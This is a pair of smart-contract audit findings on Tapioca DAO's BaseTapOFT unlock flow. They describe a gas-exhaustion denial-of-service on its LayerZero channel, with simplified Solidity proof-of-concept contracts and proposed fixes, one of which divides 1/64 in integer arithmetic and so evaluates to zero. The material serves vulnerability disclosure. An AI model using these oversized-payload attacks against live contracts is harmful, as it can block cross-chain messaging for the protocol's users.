# Q1

In the function `BaseTapOFT::_unlockTwTapPosition`, inside the try-statement, it is possible to steal gas.
https://github.com/Tapioca-DAO/tap-token-audit/blob/59749be5bc2286f0bdbf59d7ddc258ddafd49a9f/contracts/tokens/BaseTapOFT.sol#L291
Suppose, an attacker provides long `twTapSendBackAdapterParams` during exiting a twTAP in the source chain, so that the `lzPayload` is 10kb long. In other words:
```
twTapSendBackAdapterParams = {refundAddress: payable(0), zroPaymentAddress: address(0), adapterParams: long data almost equal to 10kb}
```
https://github.com/Tapioca-DAO/tapioca-sdk/blob/9a16fc9d7b91ee147c70bf10f015be2af65e8f5f/src/contracts/token/oft/v2/ICommonOFT.sol#L12C5-L16C6
https://github.com/Tapioca-DAO/tap-token-audit/blob/59749be5bc2286f0bdbf59d7ddc258ddafd49a9f/contracts/tokens/BaseTapOFT.sol#L258

In the destination chain, when the transaction reaches to `BaseTapOFT::_unlockTwTapPosition`, it calls `exitPositionAndSendTap`.
https://github.com/Tapioca-DAO/tap-token-audit/blob/59749be5bc2286f0bdbf59d7ddc258ddafd49a9f/contracts/tokens/BaseTapOFT.sol#L310C19-L310C41

If it is successful, the body of try-statement will be executed:
https://github.com/Tapioca-DAO/tap-token-audit/blob/59749be5bc2286f0bdbf59d7ddc258ddafd49a9f/contracts/tokens/BaseTapOFT.sol#L310C19-L319

In which, it calls the function `sendFrom` and passes the long `twTapSendBackAdapterParams`. 
https://github.com/Tapioca-DAO/tap-token-audit/blob/59749be5bc2286f0bdbf59d7ddc258ddafd49a9f/contracts/tokens/BaseTapOFT.sol#L317

This long data is passed externally 4 times:
 - First in `BaseTapOFT::_unlockTwTapPosition`
https://github.com/Tapioca-DAO/tap-token-audit/blob/59749be5bc2286f0bdbf59d7ddc258ddafd49a9f/contracts/tokens/BaseTapOFT.sol#L312
 - Second in `LzApp::_lzSend`
https://github.com/Tapioca-DAO/tapioca-sdk/blob/7ca0dc402da6342fa6c8203bd96fb7ca942d0356/src/contracts/lzApp/LzApp.sol#L53
 - Third in `Endpoint::send`
https://github.com/LayerZero-Labs/LayerZero/blob/48c21c3921931798184367fc02d3a8132b041942/contracts/Endpoint.sol#L95
 - Fourth in `UltraLightNodeV2::_handleRelayer`
https://github.com/LayerZero-Labs/LayerZero/blob/48c21c3921931798184367fc02d3a8132b041942/contracts/UltraLightNodeV2.sol#L169

So, 4 times this long data (almost 10kb) is externally passed to other contracts which almost consumes 110k gas (ignoring the other processing on this data meanwhile). 
It means that at least 100k gas will be consumed inside the try-body:
https://github.com/Tapioca-DAO/tap-token-audit/blob/59749be5bc2286f0bdbf59d7ddc258ddafd49a9f/contracts/tokens/BaseTapOFT.sol#L310-L318

If this amount of gas is more that the `gasleft`, the body of try-statement will revert (it will not caught by the same try/catch), and it is supposed to be caught by the `LzApp`. Since it must also store this long data, it is possible that it goes out of gas, so it will be caught by the `Endpoint`. This leads to blocking the next messages which is kind of DoS attack. 

The following PoC, shows the simplified version. To execute it, the contracts `Endpoint` should be deployed, and then the address of deployed `Endpoint` should be pass in the constructor of `LzApp` to be deployed:
 - `_srcChainId` = 0 it is not necessary for the PoC
 - `_srcAddress` = "" it is not necessary for the PoC
 - `_dstAddress` = the address of deployed `LzApp` 
 - `_nonce` =  0 it is not necessary for the PoC
 - `_gasLimit` = 200_000 I am assuming that the gas limit is set to 200_000 by the relayer. This is a realistic value taken from other dapps deployed on LZ.
 - `_payload` = using the Helper contract to generate almost 10kb data

It shows that the event `PayloadStored` is emitted instead of inner catch statements event `CallFailedBytes`.

## Recommended Mitigation Steps
It is recommended to put the body of try-statement in another try/catch:

```
function _unlockTwTapPosition(uint16 _srcChainId, bytes memory _payload)
        internal
        virtual
    {
        (
            ,
            ,
            address to,
            uint256 tokenID,
            LzCallParams memory twTapSendBackAdapterParams
        ) = abi.decode(
                _payload,
                (uint16, address, address, uint256, LzCallParams)
            );

        // Only the owner can unlock
        require(twTap.ownerOf(tokenID) == to, "TapOFT: Not owner");

        // Exit and receive tokens to this contract
        try twTap.exitPositionAndSendTap(tokenID) returns (uint256 _amount) {
            // Transfer them to the user
            try
                this.sendFrom{value: address(this).balance}(
                    address(this),
                    _srcChainId,
                    LzLib.addressToBytes32(to),
                    _amount,
                    twTapSendBackAdapterParams
                )
            {} catch {}
        } catch Error(string memory _reason) {
            emit CallFailedStr(_srcChainId, _payload, _reason);
        } catch (bytes memory _reason) {
            emit CallFailedBytes(_srcChainId, _payload, _reason);
        }
    }
```

```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

import "https://github.com/Tapioca-DAO/tapioca-sdk/blob/7ca0dc402da6342fa6c8203bd96fb7ca942d0356/src/contracts/util/ExcessivelySafeCall.sol";

interface ILayerZeroReceiver {
    function lzReceive(
        uint16 _srcChainId,
        bytes calldata _srcAddress,
        uint64 _nonce,
        bytes calldata _payload
    ) external;
}

interface ILayerZeroEndpoint {
    function send(
        uint16 _dstChainId,
        bytes calldata _destination,
        bytes calldata _payload,
        address payable _refundAddress,
        address _zroPaymentAddress,
        bytes calldata _adapterParams
    ) external payable;
}

interface ILayerZeroUltraLightNodeV2 {
    function send(
        address _ua,
        uint64,
        uint16 _dstChainId,
        bytes calldata _path,
        bytes calldata _payload,
        address payable _refundAddress,
        address _zroPaymentAddress,
        bytes calldata _adapterParams
    ) external payable;
}

interface IERC721Receiver {
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4);
}

struct LzCallParams {
    address payable refundAddress;
    address zroPaymentAddress;
    bytes adapterParams;
}

contract Endpoint {
    struct StoredPayload {
        uint64 payloadLength;
        address dstAddress;
        bytes32 payloadHash;
    }

    mapping(uint16 => mapping(bytes => StoredPayload)) public storedPayload;
    event PayloadStored(
        uint16 srcChainId,
        bytes srcAddress,
        address dstAddress,
        uint64 nonce,
        bytes payload,
        bytes reason
    );

    UltraLightNodeV2 uln;

    constructor() {
        uln = new UltraLightNodeV2();
    }

    function receivePayload(
        uint16 _srcChainId,
        bytes calldata _srcAddress,
        address _dstAddress,
        uint64 _nonce,
        uint256 _gasLimit,
        bytes calldata _payload
    ) public {
        try
            ILayerZeroReceiver(_dstAddress).lzReceive{gas: _gasLimit}(
                _srcChainId,
                _srcAddress,
                _nonce,
                _payload
            )
        {} catch (bytes memory reason) {
            storedPayload[_srcChainId][_srcAddress] = StoredPayload(
                uint64(_payload.length),
                _dstAddress,
                keccak256(_payload)
            );
            emit PayloadStored(
                _srcChainId,
                _srcAddress,
                _dstAddress,
                _nonce,
                _payload,
                reason
            );
        }
    }

    function send(
        uint16 _dstChainId,
        bytes calldata _destination,
        bytes calldata _payload,
        address payable _refundAddress,
        address _zroPaymentAddress,
        bytes calldata _adapterParams
    ) external payable {
        uln.send{value: msg.value}(
            msg.sender,
            0,
            _dstChainId,
            _destination,
            _payload,
            _refundAddress,
            _zroPaymentAddress,
            _adapterParams
        );
    }
}

contract UltraLightNodeV2 {
    RelayerV2 relayer;

    constructor() {
        relayer = new RelayerV2();
    }

    function send(
        address _ua,
        uint64,
        uint16 _dstChainId,
        bytes calldata _path,
        bytes calldata _payload,
        address payable _refundAddress,
        address _zroPaymentAddress,
        bytes calldata _adapterParams
    ) external payable {
        address ua = _ua;
        uint16 dstChainId = _dstChainId;

        bytes memory dstAddress;
        uint64 nonce;

        bytes memory payload = _payload;
        uint256 relayerFee = _handleRelayer(
            dstChainId,
            bytes32(0),
            ua,
            payload.length,
            _adapterParams
        );
    }

    function _handleRelayer(
        uint16 _dstChainId,
        bytes32,
        address _ua,
        uint256 _payloadSize,
        bytes memory _adapterParams
    ) internal returns (uint256 relayerFee) {
        relayerFee = relayer.assignJob(
            _dstChainId,
            uint16(0),
            _ua,
            _payloadSize,
            _adapterParams
        );
    }
}

contract RelayerV2 {
    function assignJob(
        uint16 _dstChainId,
        uint16 _outboundProofType,
        address _userApplication,
        uint256 _payloadSize,
        bytes calldata _adapterParams
    ) external returns (uint256) {
        // require(_payloadSize <= 10000, "Relayer: _payloadSize tooooo big");
        (uint256 basePrice, uint256 pricePerByte) = _getPrices(
            _dstChainId,
            _outboundProofType,
            _userApplication,
            _adapterParams
        );
        return 0;
    }

    function _getPrices(
        uint16 _dstChainId,
        uint16 _outboundProofType,
        address,
        bytes memory _adapterParameters
    ) internal view returns (uint256 basePrice, uint256 pricePerByte) {
        require(
            _adapterParameters.length == 34 || _adapterParameters.length > 66,
            "Relayer: wrong _adapterParameters size"
        );
        uint16 txType;
        uint256 extraGas;
        assembly {
            txType := mload(add(_adapterParameters, 2))
            extraGas := mload(add(_adapterParameters, 34))
        }
        require(false, "Relayer: gas too low");
    }
}

contract LzApp {
    using ExcessivelySafeCall for address;
    TwTap twTap;
    event CallFailedStr(uint16 _srcChainId, bytes _payload, string _reason);
    event CallFailedBytes(uint16 _srcChainId, bytes _payload, bytes _reason);
    mapping(address => uint256) public _balances;
    event Transfer(address indexed from, address indexed to, uint256 value);
    mapping(uint16 => mapping(bytes => mapping(uint64 => bytes32)))
        public failedMessages;
    event MessageFailed(
        uint16 _srcChainId,
        bytes _srcAddress,
        uint64 _nonce,
        bytes _payload,
        bytes _reason
    );
    address endpointAddress;

    constructor(address _addr) {
        twTap = new TwTap();
        endpointAddress = _addr;
    }

    function lzReceive(
        uint16 _srcChainId,
        bytes calldata _srcAddress,
        uint64 _nonce,
        bytes calldata _payload
    ) public {
        (bool success, bytes memory reason) = address(this).excessivelySafeCall(
            gasleft(),
            150,
            abi.encodeWithSelector(
                this.nonblockingLzReceive.selector,
                _srcChainId,
                _srcAddress,
                _nonce,
                _payload
            )
        );

        if (!success) {
            _storeFailedMessage(
                _srcChainId,
                _srcAddress,
                _nonce,
                _payload,
                reason
            );
        }
    }

    function _storeFailedMessage(
        uint16 _srcChainId,
        bytes memory _srcAddress,
        uint64 _nonce,
        bytes memory _payload,
        bytes memory _reason
    ) internal virtual {
        failedMessages[_srcChainId][_srcAddress][_nonce] = keccak256(_payload);
        emit MessageFailed(_srcChainId, _srcAddress, _nonce, _payload, _reason);
    }

    function nonblockingLzReceive(
        uint16 _srcChainId,
        bytes calldata _srcAddress,
        uint64 _nonce,
        bytes calldata _payload
    ) public {
        _nonblockingLzReceive(_srcChainId, _srcAddress, _nonce, _payload);
    }

    function _nonblockingLzReceive(
        uint16 _srcChainId,
        bytes memory _srcAddress,
        uint64 _nonce,
        bytes memory _payload
    ) internal {
        _unlockTwTapPosition(_srcChainId, _payload);
    }

    event Gas(uint256);

    function _unlockTwTapPosition(uint16 _srcChainId, bytes memory _payload)
        internal
        virtual
    {
        LzCallParams memory twTapSendBackAdapterParams = abi.decode(
            _payload,
            (LzCallParams)
        );
        emit Gas(gasleft());

        // Exit and receive tokens to this contract
        try twTap.exitPositionAndSendTap(0) returns (uint256 _amount) {
            emit Gas(gasleft());
            // Transfer them to the user
            this.sendFrom{value: 0}(
                address(this),
                _srcChainId,
                bytes32(0),
                _amount,
                twTapSendBackAdapterParams
            );
            emit Gas(gasleft());
        } catch Error(string memory _reason) {
            emit CallFailedStr(_srcChainId, _payload, _reason);
        } catch (bytes memory _reason) {
            emit CallFailedBytes(_srcChainId, _payload, _reason);
        }
    }

    function sendFrom(
        address _from,
        uint16 _dstChainId,
        bytes32 _toAddress,
        uint256 _amount,
        LzCallParams calldata _callParams
    ) public payable virtual {
        _send(
            _from,
            _dstChainId,
            _toAddress,
            _amount,
            _callParams.refundAddress,
            _callParams.zroPaymentAddress,
            _callParams.adapterParams
        );
    }

    function _send(
        address _from,
        uint16 _dstChainId,
        bytes32 _toAddress,
        uint256 _amount,
        address payable _refundAddress,
        address _zroPaymentAddress,
        bytes memory _adapterParams
    ) internal virtual returns (uint256 amount) {
        _lzSend(
            _dstChainId,
            "",
            _refundAddress,
            _zroPaymentAddress,
            _adapterParams,
            msg.value
        );
    }

    function _lzSend(
        uint16 _dstChainId,
        bytes memory _payload,
        address payable _refundAddress,
        address _zroPaymentAddress,
        bytes memory _adapterParams,
        uint256 _nativeFee
    ) internal {
        ILayerZeroEndpoint(endpointAddress).send{value: _nativeFee}(
            _dstChainId,
            "",
            _payload,
            _refundAddress,
            _zroPaymentAddress,
            _adapterParams
        );
    }
}

contract TwTap {
    function exitPositionAndSendTap(uint256 _tokenId)
        external
        returns (uint256)
    {
        // require(msg.sender == address(tapOFT), "twTAP: only tapOFT");
        return _releaseTap(_tokenId, address(0));
    }

    function _releaseTap(uint256 _tokenId, address _to)
        internal
        returns (uint256 releasedAmount)
    {}
}

contract Helper {
    function encoder() public view returns (bytes memory payload) {
        LzCallParams memory callParams;
        callParams.refundAddress = payable(0);
        callParams.zroPaymentAddress = address(0);
        uint256[] memory tempArray = new uint256[](300);
        callParams.adapterParams = abi.encode(tempArray);
        payload = abi.encode(callParams);
    }
}

```

# Q2
## Impact

This vulnerability is similar to the report "Blocking the receiving channel by claiming long arbitrary rewards token from a twTAP position", but for other function and mechanism of the protocol. But since the possibility is lower, it is categorized as Low.

It is possible to apply DoS attack by sending arbitrary long payload during exiting a twTAP by participating in twAML.

## Proof of Concept

An attacker can apply DoS attack with the following flow:

 - The attacker calls `unlockTwTapPosition` with very long `twTapSendBackAdapterParams`. So that, the `lzPayload` length will be equal to about 10kb. `twTapSendBackAdapterParams` is a structure type, so by assigning arbitrary long data to `adapterParams`, we can pass almost 10kb `lzPayload` during calling `unlockTwTapPosition`:
```
    struct LzCallParams {
        address payable refundAddress;
        address zroPaymentAddress;
        bytes adapterParams;
    }
```
For example:
```
        bytes memory lzPayload = abi.encode(
            PT_UNLOCK_TWTAP, // 2 bytes
            msg.sender, // 20 bytes
            to, // 20 bytes
            tokenID, // 32 bytes
            twTapSendBackAdapterParams // 10*1024 - 2 - 20 - 20 - 32 = 10166 bytes
        );
```
https://github.com/Tapioca-DAO/tap-token-audit/blob/59749be5bc2286f0bdbf59d7ddc258ddafd49a9f/contracts/tokens/BaseTapOFT.sol#L258
https://github.com/Tapioca-DAO/tapioca-sdk/blob/9a16fc9d7b91ee147c70bf10f015be2af65e8f5f/src/contracts/token/oft/v2/ICommonOFT.sol#L12C5-L16C6
Please note that there is a limitation of 10kb for the `payload` during assigning the job to the relayer in LayerZero:
https://github.com/LayerZero-Labs/LayerZero/blob/48c21c3921931798184367fc02d3a8132b041942/contracts/RelayerV2.sol#L151

 - Then the flow of sending the message from source chain is:
BaseTapOFT::unlockTwTapPosition>> LzApp::_lzSend >> Endpoint::send >> UltraLightNodeV2::send

https://github.com/Tapioca-DAO/tap-token-audit/blob/59749be5bc2286f0bdbf59d7ddc258ddafd49a9f/contracts/tokens/BaseTapOFT.sol#L258
https://github.com/Tapioca-DAO/tapioca-sdk/blob/7ca0dc402da6342fa6c8203bd96fb7ca942d0356/src/contracts/lzApp/LzApp.sol#L49
https://github.com/LayerZero-Labs/LayerZero/blob/48c21c3921931798184367fc02d3a8132b041942/contracts/Endpoint.sol#L92C14-L92C18
https://github.com/LayerZero-Labs/LayerZero/blob/48c21c3921931798184367fc02d3a8132b041942/contracts/UltraLightNodeV2.sol#L116C14-L116C18

 - On the destination chain, the flow is (ignoring the other contracts related to LayerZero during relaying the message to the destination chain):
Endpoint::receivePayload >> LzApp::lzReceive >> NonblockingLzApp::_blockingLzReceive >> NonblockingLzApp::nonblockingLzReceive >> BaseTapOFT::_nonblockingLzReceive >> BaseTapOFT::_unlockTwTapPosition>> twTAP::exitPositionAndSendTap>> twTAP::_releaseTap

https://github.com/LayerZero-Labs/LayerZero/blob/48c21c3921931798184367fc02d3a8132b041942/contracts/Endpoint.sol#L100C14-L100C28
https://github.com/Tapioca-DAO/tapioca-sdk/blob/7ca0dc402da6342fa6c8203bd96fb7ca942d0356/src/contracts/lzApp/LzApp.sol#L35
https://github.com/Tapioca-DAO/tapioca-sdk/blob/7ca0dc402da6342fa6c8203bd96fb7ca942d0356/src/contracts/lzApp/NonblockingLzApp.sol#L24
https://github.com/Tapioca-DAO/tapioca-sdk/blob/7ca0dc402da6342fa6c8203bd96fb7ca942d0356/src/contracts/lzApp/NonblockingLzApp.sol#L37
https://github.com/Tapioca-DAO/tap-token-audit/blob/59749be5bc2286f0bdbf59d7ddc258ddafd49a9f/contracts/tokens/BaseTapOFT.sol#L52
https://github.com/Tapioca-DAO/tap-token-audit/blob/59749be5bc2286f0bdbf59d7ddc258ddafd49a9f/contracts/tokens/BaseTapOFT.sol#L291
https://github.com/Tapioca-DAO/tap-token-audit/blob/59749be5bc2286f0bdbf59d7ddc258ddafd49a9f/contracts/governance/twTAP.sol#L387C14-L387C36
https://github.com/Tapioca-DAO/tap-token-audit/blob/59749be5bc2286f0bdbf59d7ddc258ddafd49a9f/contracts/governance/twTAP.sol#L522C14-L522C25



 - When the function `_releaseTap` is called, let's say the position related to `_tokenId` is not expired yet, so it will revert due to `twTAP: Lock not expired`. There can be many reasons to revert in this function but I chooses the simplest one (the focus of the vulnerability is not in this function, so only reverting here is enough to prove the vulnerability). 
https://github.com/Tapioca-DAO/tap-token-audit/blob/59749be5bc2286f0bdbf59d7ddc258ddafd49a9f/contracts/governance/twTAP.sol#L530C54-L530C77

 - Now that `twTap.exitPositionAndSendTap` is reverted, it will be caught by the try/catch statement:
https://github.com/Tapioca-DAO/tap-token-audit/blob/59749be5bc2286f0bdbf59d7ddc258ddafd49a9f/contracts/tokens/BaseTapOFT.sol#L319-L323

 - Then the event `CallFailedStr` is emitted with `_payload` as parameter. Since, the `_payload` length is almost 10kb, emitting such long data consumes large amount of gas. If the required gas for emitting such data is higher than `gasleft()` in this function, this function will be reverted.

 - When this function is reverted, it is supposed to be stored in the mapping `failedMessages` in `NonblockingLzApp`. 
https://github.com/Tapioca-DAO/tapioca-sdk/blob/7ca0dc402da6342fa6c8203bd96fb7ca942d0356/src/contracts/lzApp/NonblockingLzApp.sol#L28

 - But, as well as storing the `keccak256(_payload)`, the long `_payload` is again emitted as parameter of the event `MessageFailed`. 
https://github.com/Tapioca-DAO/tapioca-sdk/blob/7ca0dc402da6342fa6c8203bd96fb7ca942d0356/src/contracts/lzApp/NonblockingLzApp.sol#L34C14-L34C27

 - That again consumes large gas, and can lead to OOG in this function, and it will be caught by the try/catch statement in the `Endpoint`.
https://github.com/LayerZero-Labs/LayerZero/blob/48c21c3921931798184367fc02d3a8132b041942/contracts/Endpoint.sol#L122


Using the following PoC (that is the simplified version of contracts and functions), it shows that the OOG error will not be caught by the LzApp, and it will lead to DoS attack (as it will be caught by the `Endpoint`). 

For example, it shows that if `_gasLimit` passed by the relayer is equal to 140_000, and payload length is about 10kb (with arbitrary long `adapterParams` in the structure `LzCallParams`), the revert will not be caught by the Tapioca, because:

 - First: In the try/catch statement of `BaseTapOFT`, the `payload` is emitted as a parameter of the event `CallFailedStr`. Since, the `payload` is long, this emit will consume large amount of gas leading to OOG in the function as `gasleft() < required gas to emit long payload`.
https://github.com/Tapioca-DAO/tap-token-audit/blob/59749be5bc2286f0bdbf59d7ddc258ddafd49a9f/contracts/tokens/BaseTapOFT.sol#L320C18-L320C31

 - Second: In the `NonblockingLzApp`, the reverted tx is supposed to be stored in the mapping `failedMessages`. Moreover, this long `payload` again should be emitted as a parameter of the event `MessageFailed` that consumes large amount of gas, leading to OOG as `(1/64)*_gasLimit < required gas to emit long payload`.
https://github.com/Tapioca-DAO/tapioca-sdk/blob/7ca0dc402da6342fa6c8203bd96fb7ca942d0356/src/contracts/lzApp/NonblockingLzApp.sol#L34


So, this revert will be caught in the `Endpoint`, as it is supposed that the relayer provided enough gas for such cases.
https://github.com/LayerZero-Labs/LayerZero/blob/48c21c3921931798184367fc02d3a8132b041942/contracts/Endpoint.sol#L122

As a result, no new messages can be relayed to LzApp of Tapioca as far as this failed message is not handled whether by `retrying` the message with large enough gas (so that `(1/64)*_gasLimit` is enough to store the failed message in LzApp), or `forcing the resume receive` by the owner of Tapioca.
https://github.com/LayerZero-Labs/LayerZero/blob/48c21c3921931798184367fc02d3a8132b041942/contracts/Endpoint.sol#L127
https://github.com/LayerZero-Labs/LayerZero/blob/48c21c3921931798184367fc02d3a8132b041942/contracts/Endpoint.sol#L209

In the first case (retrying the failed message in the `Endpoint`), the cost of large gas should be paid by the caller to open the channel again. 
In the second case (force resuming the receive), the message will be removed and it will open the channel. 

**Please note that this attack can be repeated again so it is kind of permanent DoS attack.**

**Moreover, catching the error in the `Endpoint` is the last resort. It is expected that all the errors be caught in the LzApp, because catching the error in the `Endpoint` is a blocking for the next messages, so it is not a very under-control condition.**

**In summary, a malicious user bridges a message (exiting a twTAP) with long payload (with arbitrary long `adapterParams` in the structure `LzCallParams`), to stop the channel of Tapioca's LzApp.**

In the following PoC, I have simplified the contracts and just keeping the related functions in the explained flow above. 

To test the PoC, it is needed to deploy two contracts `Endpoint` and `LzApp`, and then calls the function `receivePayload` in the `Endpoint` (the contract `Helper` is just to generate a payload with arbitrary long `adapterParams` in the structure `LzCallParams` to have almost 10kb payload). It mimics as if the UltraLighNodeV2 is calling the function `receivePayload`. The passed parameters to show the vulnerability:
 - `_srcChainId` = 0 it is not necessary for the PoC
 - `_srcAddress` = "" it is not necessary for the PoC
 - `_dstAddress` = the address of deployed `LzApp` 
 - `_nonce` =  0 it is not necessary for the PoC
 - `_gasLimit` = 140_000 I am assuming that the gas limit is set to 140_000 by the relayer. This is a realistic value taken from other dapps deployed on LZ.
 - `_payload` = 
In reality the `_payload` is calculated with the following formula:
```
bytes memory lzPayload = abi.encode(
            PT_UNLOCK_TWTAP, // packet type
            msg.sender,
            to,
            tokenID,
            twTapSendBackAdapterParams
        );
```  
https://github.com/Tapioca-DAO/tap-token-audit/blob/59749be5bc2286f0bdbf59d7ddc258ddafd49a9f/contracts/tokens/BaseTapOFT.sol#L266C9-L272C11
But, for simplicity, I pass the following data as `_payload` and ignoring the other parameters as they do not have anything to do with the PoC. Just I want to have a payload with the maximum allowable length (10kb):
```
        LzCallParams memory callParams;
        callParams.refundAddress = payable(0);
        callParams.zroPaymentAddress = address(0);
        uint256[] memory tempArray = new uint256[](300);
        callParams.adapterParams = abi.encode(tempArray);
        payload = abi.encode(callParams);
``` 

The PoC shows that the tx will be reverted and caught in the `Endpoint` (you can see in the test that the event `PayloadStored` is emitted instead of `CallFailedStr`), which leads to the impacts I explained above.

**This shows that Tapioca did not safely consider the case that the tx is reverted and the payload is very long to be emitted as a failed message.**

```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

import "https://github.com/Tapioca-DAO/tapioca-sdk/blob/7ca0dc402da6342fa6c8203bd96fb7ca942d0356/src/contracts/util/ExcessivelySafeCall.sol";

interface ILayerZeroReceiver {
    function lzReceive(
        uint16 _srcChainId,
        bytes calldata _srcAddress,
        uint64 _nonce,
        bytes calldata _payload
    ) external;
}

interface IERC721Receiver {
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4);
}

struct LzCallParams {
    address payable refundAddress;
    address zroPaymentAddress;
    bytes adapterParams;
}

contract Endpoint {
    struct StoredPayload {
        uint64 payloadLength;
        address dstAddress;
        bytes32 payloadHash;
    }

    mapping(uint16 => mapping(bytes => StoredPayload)) public storedPayload;
    event PayloadStored(
        uint16 srcChainId,
        bytes srcAddress,
        address dstAddress,
        uint64 nonce,
        bytes payload,
        bytes reason
    );

    function receivePayload(
        uint16 _srcChainId,
        bytes calldata _srcAddress,
        address _dstAddress,
        uint64 _nonce,
        uint256 _gasLimit,
        bytes calldata _payload
    ) public {
        try
            ILayerZeroReceiver(_dstAddress).lzReceive{gas: _gasLimit}(
                _srcChainId,
                _srcAddress,
                _nonce,
                _payload
            )
        {} catch (bytes memory reason) {
            storedPayload[_srcChainId][_srcAddress] = StoredPayload(
                uint64(_payload.length),
                _dstAddress,
                keccak256(_payload)
            );
            emit PayloadStored(
                _srcChainId,
                _srcAddress,
                _dstAddress,
                _nonce,
                _payload,
                reason
            );
        }
    }
}

contract LzApp {
    using ExcessivelySafeCall for address;
    TwTap twTap;
    event CallFailedStr(uint16 _srcChainId, bytes _payload, string _reason);
    event CallFailedBytes(uint16 _srcChainId, bytes _payload, bytes _reason);
    mapping(address => uint256) public _balances;
    event Transfer(address indexed from, address indexed to, uint256 value);
    mapping(uint16 => mapping(bytes => mapping(uint64 => bytes32)))
        public failedMessages;
    event MessageFailed(
        uint16 _srcChainId,
        bytes _srcAddress,
        uint64 _nonce,
        bytes _payload,
        bytes _reason
    );

    constructor() {
        twTap = new TwTap();
    }

    function lzReceive(
        uint16 _srcChainId,
        bytes calldata _srcAddress,
        uint64 _nonce,
        bytes calldata _payload
    ) public {
        (bool success, bytes memory reason) = address(this).excessivelySafeCall(
            gasleft(),
            150,
            abi.encodeWithSelector(
                this.nonblockingLzReceive.selector,
                _srcChainId,
                _srcAddress,
                _nonce,
                _payload
            )
        );

        if (!success) {
            _storeFailedMessage(
                _srcChainId,
                _srcAddress,
                _nonce,
                _payload,
                reason
            );
        }
    }

    function _storeFailedMessage(
        uint16 _srcChainId,
        bytes memory _srcAddress,
        uint64 _nonce,
        bytes memory _payload,
        bytes memory _reason
    ) internal virtual {
        failedMessages[_srcChainId][_srcAddress][_nonce] = keccak256(_payload);
        emit MessageFailed(_srcChainId, _srcAddress, _nonce, _payload, _reason);
    }

    function nonblockingLzReceive(
        uint16 _srcChainId,
        bytes calldata _srcAddress,
        uint64 _nonce,
        bytes calldata _payload
    ) public {
        _nonblockingLzReceive(_srcChainId, _srcAddress, _nonce, _payload);
    }

    function _nonblockingLzReceive(
        uint16 _srcChainId,
        bytes memory _srcAddress,
        uint64 _nonce,
        bytes memory _payload
    ) internal {
        _unlockTwTapPosition(_srcChainId, _payload);
    }

    function _unlockTwTapPosition(uint16 _srcChainId, bytes memory _payload)
        internal
        virtual
    {
        LzCallParams memory twTapSendBackAdapterParams = abi.decode(
            _payload,
            (LzCallParams)
        );

        // Exit and receive tokens to this contract
        try twTap.exitPositionAndSendTap(0) returns (uint256 _amount) {
            //...
        } catch Error(string memory _reason) {
            emit CallFailedStr(_srcChainId, _payload, _reason);
        } catch (bytes memory _reason) {
            emit CallFailedBytes(_srcChainId, _payload, _reason);
        }
    }
}

contract TwTap {
    function exitPositionAndSendTap(uint256 _tokenId)
        external
        returns (uint256)
    {
        // require(msg.sender == address(tapOFT), "twTAP: only tapOFT");
        return _releaseTap(_tokenId, address(0));
    }

    function _releaseTap(uint256 _tokenId, address _to)
        internal
        returns (uint256 releasedAmount)
    {
        // Participation memory position = participants[_tokenId];
        // if (position.tapReleased) {
        //     return 0;
        // }
        require(false, "twTAP: Lock not expired");
        //...
    }
}

contract Helper {
    function encoder() public view returns (bytes memory payload) {
        LzCallParams memory callParams;
        callParams.refundAddress = payable(0);
        callParams.zroPaymentAddress = address(0);
        uint256[] memory tempArray = new uint256[](300);
        callParams.adapterParams = abi.encode(tempArray);
        payload = abi.encode(callParams);
    }
}


```

## Tools Used

## Recommended Mitigation Steps

In general emitting such long data (as payload) is not a good approach.

So it seems better to add a check before the external function call `try twTap.exitPositionAndSendTap` to be sure that there is enough gas for emitting such long data. 
```
function _unlockTwTapPosition(
        uint16 _srcChainId,
        bytes memory _payload
    ) internal virtual {
        //...

        require((1/64)*gasleft() > 100_000, "not enough gas to emit long payload");

        // Exit and receive tokens to this contract
        try twTap.exitPositionAndSendTap(tokenID) returns (uint256 _amount) {
            // Transfer them to the user
            this.sendFrom{value: address(this).balance}(
                address(this),
                _srcChainId,
                LzLib.addressToBytes32(to),
                _amount,
                twTapSendBackAdapterParams
            );
        } catch Error(string memory _reason) {
            emit CallFailedStr(_srcChainId, _payload, _reason);
        } catch (bytes memory _reason) {
            emit CallFailedBytes(_srcChainId, _payload, _reason);
        }
    }
```
https://github.com/Tapioca-DAO/tap-token-audit/blob/59749be5bc2286f0bdbf59d7ddc258ddafd49a9f/contracts/tokens/BaseTapOFT.sol#L291
